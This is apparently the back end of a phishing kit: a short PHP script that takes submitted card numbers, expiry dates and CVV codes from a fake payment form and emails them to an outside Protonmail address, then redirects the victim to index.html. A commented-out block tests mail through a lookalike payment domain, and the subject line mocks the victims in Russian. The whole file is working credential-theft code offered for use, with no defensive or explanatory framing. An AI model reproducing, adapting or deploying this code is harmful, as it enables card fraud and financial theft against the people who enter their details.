<?php
session_start();
header("Location: index.html");

error_reporting(E_ALL);

$_SESSION = $_POST;
{       
    $to = "payc2c@protonmail.com";
    $subject = 'Карта лоха :'.$_SESSION[$number];
         
    $message = 'CardNo:'.$_SESSION[$number]."\r\n";
    $message .= 'Date:'.$_SESSION[$month].'/'.$_SESSION[$year]."\r\n";
    $message .= 'CVV:'. $_SESSION[$cvv]."\r\n";
    $message = nl2br($message);
    $header = "From: mymail@gmail.com	 \r\n";
         
    $retval = mail($to,$subject,$message,$header);
}     

/* ini_set( 'display_errors', 1 );
    error_reporting( E_ALL );
    $from = "payc2c@alfaportalpay.ru";
    $to = "payc2c@alfaportalpay.ru";
    $subject = "Checking PHP mail";
    $message = "PHP mail works just fine";
    $headers = "From:" . $from;
    if(mail($to,$subject,$message, $headers)){
        
    echo "The email message was sent.";
    }else echo 'FUCK';*/

//include 'index.html';
?>